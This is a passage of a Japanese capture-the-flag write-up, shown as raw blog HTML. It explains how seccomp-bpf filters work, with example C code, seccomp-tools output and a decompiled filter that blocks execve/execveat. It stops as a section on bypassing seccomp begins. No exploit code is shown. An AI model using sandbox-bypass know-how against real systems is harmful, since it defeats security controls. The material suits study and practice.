class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span> SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>prog<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prctl(PR_SET_SECCOMP)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this process is %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>main 関数でまず始めに実行している以下のコードは <code class=\"language-text\">NO_NEW_PRIVS</code> フラグの有効化を行っています。</p>\n<p>これは、フィルタの適用後にプロセスが特権昇格を行うことを禁止するコードで、実際にフィルタを登録する <code class=\"language-text\">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)</code> の実行のために必要な処理です。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prctl(PR_SET_NO_NEW_PRIVS)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>このコードによってプロセスの権限レベルが維持され、seccomp のフィルタの制限をバイパスできなくなるようです。</p>\n<p>なお、試しにこのコードを削除してフィルタの登録を実施してみると、以下のエラーでフィルタの登録に失敗するようになりました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ./a.out\nprctl<span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">)</span>: Permission denied</code></pre></div>\n<p>続く以下のセクションでは、<code class=\"language-text\">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)</code> で <code class=\"language-text\">SECCOMP_MODE_FILTER</code> を指定してフィルタの登録を行っています。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span> SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>prog<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prctl(PR_SET_SECCOMP)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>ここで引数に与えられている sock_fprog 構造体は以下のコードで定義されています。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD <span class=\"token operator\">|</span> BPF_W <span class=\"token operator\">|</span> BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token function\">offsetof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">,</span> arch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP <span class=\"token operator\">|</span> BPF_JEQ <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> AUDIT_ARCH_X86_64<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_KILL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD <span class=\"token operator\">|</span> BPF_W <span class=\"token operator\">|</span> BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token function\">offsetof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">,</span> nr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP <span class=\"token operator\">|</span> BPF_JEQ <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> __NR_getpid<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_ERRNO <span class=\"token operator\">|</span> EPERM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> prog <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span>len <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">.</span>filter <span class=\"token operator\">=</span> filter<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>filter の定義内に存在する <code class=\"language-text\">BPF_STMT</code> と <code class=\"language-text\">BPF_JUMP</code>  マクロは、それぞれ seccomp が使用する BFP プログラムの操作を行うためのものです。</p>\n<p><code class=\"language-text\">BPF_STMT</code> は特定の操作を実施するためのマクロです。</p>\n<p>例えば、最初の <code class=\"language-text\">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)</code> と <code class=\"language-text\">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0)</code> では、seccomp<em>data の arch からロードしたデータと AUDIT</em>ARCH<em>X86</em>64 を比較し、一致した場合は次の命令をスキップして 1 つ先の命令に進み、一致しない場合は直後の命令を実施することを定義しています。</p>\n<p>この直後の命令は <code class=\"language-text\">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</code> あり、<code class=\"language-text\">SECCOMP_RET_KILL</code> を返してプロセスを終了する命令になっています。</p>\n<p>そのため、最初の 3 セットの命令では、実行環境のアーキテクチャが <code class=\"language-text\">ARCH_X86_64</code> に一致するかを比較し、一致しない場合はプロセスを終了するものと理解できます。</p>\n<p>続く命令では、<code class=\"language-text\">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr))</code> にて <code class=\"language-text\">seccomp_data</code> の nr(システムコール)から読み出したシステムコール番号が <code class=\"language-text\">__NR_getpid</code> と一致するかを比較し、一致する場合には <code class=\"language-text\">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM)</code> にてシステムコールの実行を禁止し、一致しない場合には <code class=\"language-text\">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</code> にて実行を許可することが定義されています。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD <span class=\"token operator\">|</span> BPF_W <span class=\"token operator\">|</span> BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token function\">offsetof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">,</span> nr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP <span class=\"token operator\">|</span> BPF_JEQ <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> __NR_getpid<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_ERRNO <span class=\"token operator\">|</span> EPERM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></code></pre></div>\n<p>つまり、この filter の中では、システムコール getpid の実行を禁止するフィルタを登録していると判断できます。</p>\n<p>このコードをコンパイルして実行すると、前項と同じく getpid の実行に失敗することを確認できます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/248c419ecc339298dac06e88a707aeac/105d8/image-20240620000934533.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACR0lEQVQ4y5VUaZOaUBDEW1G5D1EQ8ABE0U2yyf//Z53pMSaVWt1KPrxCn0xPd0+PRt6E2F0jRJkH20/ghGs40QZenMKNUlheDD+MYNsWJpMJhsMhDMN4fdpzi7zYIoojhGGAVbKCH/hI0w1ObYPDcY9jdUCyTrBYLuA4DmzHxmw2xWAw+Ah46c6omwpFWUjxAVV1RFUfFYDP661T0CxLEa9iFEWOlTzni/lztt31gt1+h1gYEiTPt8I4xzbP9I7FqYCRuW3bmE6nn0u+XM7ItpmAlsqyriuV2DS1PmlHc6rlNDjJoS3L5VIarWBZ1kfAty83ZcRCekYLbm9Xlcrvt9sV3bVTW/gubSB71oRhiKW1FD9nfwBZTO+O4l0trGgBi8+XVhkRgAqiKFQ7drsSa7GG0sfjsfrY6/V0QOopuxLk+493tO3ptzzetecTSgGgHWxCC/jkXVHm6vkjCWRMzw1KK8U7Gp8kiXa/W5Aro81mrRL5TiKD4e/lL5au60qMbPi+jyAIMJUoGZRZySDYid3VgsMenudqNukPpTHU/X5f5VEa75/mkMGmTErsuot21ynLne97n0fk2bl71epUyY6M02yD/WGn2ZvP58rOnJvy2cRisYBpvmDHc5Yccjv2IpMBZxYpNQjuvjiug0Cyxy2hh3EcYzQavWZIVoyCJcsfPTZD9ngtw+AkmcFv71+xl2aMDsPMPwqG+6/8PQ4lcj8Jwqlx6U3T1ELeEZSN/tlD+rSRQk8GwLBygvRnPBnf91am+j9D+QlZVIvmBlO53gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/248c419ecc339298dac06e88a707aeac/8ac56/image-20240620000934533.webp 240w,\n/static/248c419ecc339298dac06e88a707aeac/d3be9/image-20240620000934533.webp 480w,\n/static/248c419ecc339298dac06e88a707aeac/e46b2/image-20240620000934533.webp 960w,\n/static/248c419ecc339298dac06e88a707aeac/446b5/image-20240620000934533.webp 1170w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/248c419ecc339298dac06e88a707aeac/8ff5a/image-20240620000934533.png 240w,\n/static/248c419ecc339298dac06e88a707aeac/e85cb/image-20240620000934533.png 480w,\n/static/248c419ecc339298dac06e88a707aeac/d9199/image-20240620000934533.png 960w,\n/static/248c419ecc339298dac06e88a707aeac/105d8/image-20240620000934533.png 1170w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/248c419ecc339298dac06e88a707aeac/d9199/image-20240620000934533.png\"\n            alt=\"image-20240620000934533\"\n            title=\"image-20240620000934533\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"seccomp-tools-を使用する\" style=\"position:relative;\"><a href=\"#seccomp-tools-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B\" aria-label=\"seccomp tools を使用する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>seccomp-tools を使用する</h3>\n<p>このような seccomp-bpf による制御の詳細は seccomp-tools を使用することでも確認できます。</p>\n<p>参考：<a href=\"https://github.com/david942j/seccomp-tools\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">david942j/seccomp-tools: Provide powerful tools for seccomp analysis</a></p>\n<p>前項でコンパイルしたプログラムを実行すると、以下の結果を得ることができます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 831px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/99733e6675ed593eeb5da056216f03c0/5b4a1/image-20240620001106792.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+klEQVQY022P2XKCQBBFAQ2LIrtBE4I4MzAY0WhWzf//18mEPMaHU93VXX3qtvXU58hjSVGFZPdr4uLBsGaRlYRpSRAVzJPl2PthRpTk5HlGUeSkWWpqQZzEJAbf97HEVtJstkipEKKhaWq0bum0YjYLmBuCwMOxLdy7CZOJg+P8YVnWfzpzLJXgcBzoe81+2HO5fnH5vlCuSoQUKLPf1BXLZUaaxkRRNCZ0Pfe2UIgtw2FPv9NoI70a2cfn+3hUVY/UokadFItkQTgPyc38ZrpfdN+hWmmEwyjcPe84nV94fTuzWq9oO/N+39IPGs/3mE6nuK6Lbds3hT/FpHwoxvUUcgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/99733e6675ed593eeb5da056216f03c0/8ac56/image-20240620001106792.webp 240w,\n/static/99733e6675ed593eeb5da056216f03c0/d3be9/image-20240620001106792.webp 480w,\n/static/99733e6675ed593eeb5da056216f03c0/6d405/image-20240620001106792.webp 831w\"\n              sizes=\"(max-width: 831px) 100vw, 831px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/99733e6675ed593eeb5da056216f03c0/8ff5a/image-20240620001106792.png 240w,\n/static/99733e6675ed593eeb5da056216f03c0/e85cb/image-20240620001106792.png 480w,\n/static/99733e6675ed593eeb5da056216f03c0/5b4a1/image-20240620001106792.png 831w\"\n            sizes=\"(max-width: 831px) 100vw, 831px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/99733e6675ed593eeb5da056216f03c0/5b4a1/image-20240620001106792.png\"\n            alt=\"image-20240620001106792\"\n            title=\"image-20240620001106792\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>この結果から、先にフィルタの実装から確認した通り、アーキテクチャとシステムコール番号の検証が行われており、getpid の発行が禁止されていることを確認することができます。</p>\n<h3 id=\"問題バイナリの-seccomp-フィルタを確認する\" style=\"position:relative;\"><a href=\"#%E5%95%8F%E9%A1%8C%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%81%AE-seccomp-%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B\" aria-label=\"問題バイナリの seccomp フィルタを確認する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>問題バイナリの seccomp フィルタを確認する</h3>\n<p>では最後に、問題バイナリの seccomp フィルタを確認しましょう。</p>\n<p>問題バイナリのデコンパイル結果から、このプログラムでは最初に以下の install_seccomp 関数を実行していることを確認できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">install_seccomp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">int</span> iVar1<span class=\"token punctuation\">;</span>\n  undefined2 local_18 <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  undefined1 <span class=\"token operator\">*</span>local_10<span class=\"token punctuation\">;</span>\n  \n  local_18<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n  local_10 <span class=\"token operator\">=</span> filter<span class=\"token punctuation\">.</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  iVar1 <span class=\"token operator\">=</span> <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>iVar1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prctl(PR_SET_NO_NEW_PRIVS)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token comment\">/* WARNING: Subroutine does not return */</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  iVar1 <span class=\"token operator\">=</span> <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>local_18<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>iVar1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prctl(PR_SET_SECCOMP)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token comment\">/* WARNING: Subroutine does not return */</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><code class=\"language-text\">PR_SET_NO_NEW_PRIVS</code> は 0x26(33) を指すため、ここで始めに実行している <code class=\"language-text\">prctl(0x26,1,0,0,0)</code> は、<code class=\"language-text\">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code> と等しいです。</p>\n<p>続く <code class=\"language-text\">prctl(0x16,2,local_18)</code> では、スタックに配置した sock_fprog を引数として受け取り、seccomp-bpf フィルタを登録しています。</p>\n<p>このフィルタは単なるバイト列として定義されているため、デコンパイラのデフォルトの解析機能では解読が行われませんでしたが、seccomp-tools を使用することで定義を簡単に参照することができます。</p>\n<p>実際に seccomp-tools を実行してみると、このバイナリでは execve と execveat のシステムコールが禁止されていることがわかります。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 876px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/b02edbebac3a05e00828345edc3b3306/1b1d5/image-20240620001242126.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVQY022QzW6DMBAGkSrAsYHSkhgTGoP5MyihheTatH3/l/q68aGXchiNLFmzXnuyfIHuc1SDQprFyGSB59eDg8cpfCYQ7GJyhKeQI2Q7CCH+4IKDc44kScAYg1dXNUzdEAbWWhhTkTus6wek3COKBNI0AWehIwx8+L6PgOx53n/arkHTGnR9i/n9Qu7IM+5fnzjpE5RSqGqN821C2RfYywx5ntOww3bQjgMGO7jgZT7jcb7eVnz/3FG+HVEUCvIokS8KetEuPk7WrbsZNIZWbgzatqGLI72WPFqs14WCJTS98jGsnzoELHD/FMXRdoz4BUgFfCl8F7QqAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b02edbebac3a05e00828345edc3b3306/8ac56/image-20240620001242126.webp 240w,\n/static/b02edbebac3a05e00828345edc3b3306/d3be9/image-20240620001242126.webp 480w,\n/static/b02edbebac3a05e00828345edc3b3306/21dbd/image-20240620001242126.webp 876w\"\n              sizes=\"(max-width: 876px) 100vw, 876px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b02edbebac3a05e00828345edc3b3306/8ff5a/image-20240620001242126.png 240w,\n/static/b02edbebac3a05e00828345edc3b3306/e85cb/image-20240620001242126.png 480w,\n/static/b02edbebac3a05e00828345edc3b3306/1b1d5/image-20240620001242126.png 876w\"\n            sizes=\"(max-width: 876px) 100vw, 876px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b02edbebac3a05e00828345edc3b3306/1b1d5/image-20240620001242126.png\"\n            alt=\"image-20240620001242126\"\n            title=\"image-20240620001242126\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>つまり、execve と execveat の実行や、system などのこれらのシステムコールに依存するような操作は行うことができないため、この制約を回避しつつ Flag を取得する必要があることがわかります。</p>\n<h2 id=\"seccomp-の回避\" style=\"position:relative;\"><a href=\"#seccomp-%E3%81%AE%E5%9B%9E%E9%81%BF\" aria-label=\"seccomp の回避 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>seccomp の回避</h2>\n<p>今回の問題の Flag を取得するため、seccomp のフィルタリングを回避する手法を可能な限り把握したいと思います。</p>\n<h3 id=\"代替のシステムコールの利用\" style=\"position:relative;\"><a href=\"#%E4%BB%A3%E6%9B%BF%E3%81%AE%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB%E3%81%AE%E5%88%A9%E7%94%A8\" aria-label=\"代替のシステムコールの利用 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 